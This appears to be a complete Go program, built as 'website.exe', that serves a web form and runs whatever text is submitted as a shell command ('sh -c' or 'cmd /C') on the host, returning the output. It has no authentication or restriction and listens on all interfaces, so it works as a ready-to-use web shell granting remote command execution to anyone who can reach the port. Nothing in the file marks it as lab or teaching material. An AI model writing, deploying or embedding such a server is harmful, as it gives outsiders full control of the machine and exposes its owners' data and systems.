package main

import (
	"fmt"
	"html/template"
	"net/http"
	"os"
	"os/exec"
	"runtime"
	"strconv"
)

func executeCommand(w http.ResponseWriter, r *http.Request) {
	if r.Method == http.MethodPost {
		command := r.FormValue("command")
		var cmd *exec.Cmd

		if runtime.GOOS == "windows" {
			cmd = exec.Command("cmd", "/C", command)
		} else {
			cmd = exec.Command("sh", "-c", command)
		}

		output, err := cmd.CombinedOutput()
		if err != nil {
			http.Error(w, fmt.Sprintf("Error executing command: %s", err), http.StatusInternalServerError)
			return
		}

		data := struct {
			Command string
			Output  string
		}{
			Command: command,
			Output:  string(output),
		}

		tmpl, err := template.New("result").Parse(`
            <html>
            <body>
                <form method="post" action="/">
                <label for="command">Enter command:</label>
                <input type="text" id="command" name="command" required>
                <input type="submit" value="Execute">
                </form>
                <p>Command: {{.Command}}</p>
                <p>Output:</p>
                <pre>{{.Output}}</pre>
            </body>
            </html>
        `)
		if err != nil {
			http.Error(w, fmt.Sprintf("Error parsing template: %s", err), http.StatusInternalServerError)
			return
		}

		err = tmpl.Execute(w, data)
		if err != nil {
			http.Error(w, fmt.Sprintf("Error executing template: %s", err), http.StatusInternalServerError)
		}
	} else {
		// Display the form for GET requests
		tmpl, err := template.New("form").Parse(`
            <html>
            <body>
                <form method="post" action="/">
                    <label for="command">Enter command:</label>
                    <input type="text" id="command" name="command" required>
                    <input type="submit" value="Execute">
                </form>
            </body>
            </html>
        `)
		if err != nil {
			http.Error(w, fmt.Sprintf("Error parsing form template: %s", err), http.StatusInternalServerError)
			return
		}

		err = tmpl.Execute(w, nil)
		if err != nil {
			http.Error(w, fmt.Sprintf("Error executing form template: %s", err), http.StatusInternalServerError)
		}
	}
}

func main() {
	if len(os.Args) < 2 {
		fmt.Println("Usage: website.exe <port>")
		return
	}

	// Convert the command-line argument to an integer
	port, err := strconv.Atoi(os.Args[1])
	if err != nil {
		fmt.Println("Invalid port number. Please provide a valid integer.")
		return
	}

	// Switch Cases
	switch {
	case port >= 1 && port <= 65535:
		fmt.Printf("Running on port %d\n", port)
		http.HandleFunc("/", executeCommand)
		serverAddr := fmt.Sprintf(":%d", port)
		fmt.Printf("Server is running on %s\n", serverAddr)
		err := http.ListenAndServe(serverAddr, nil)
		if err != nil {
			fmt.Printf("Error starting server: %s\n", err)
		}
	default:
		fmt.Println("Invalid port number. Supported range: 1-65535")
	}
}
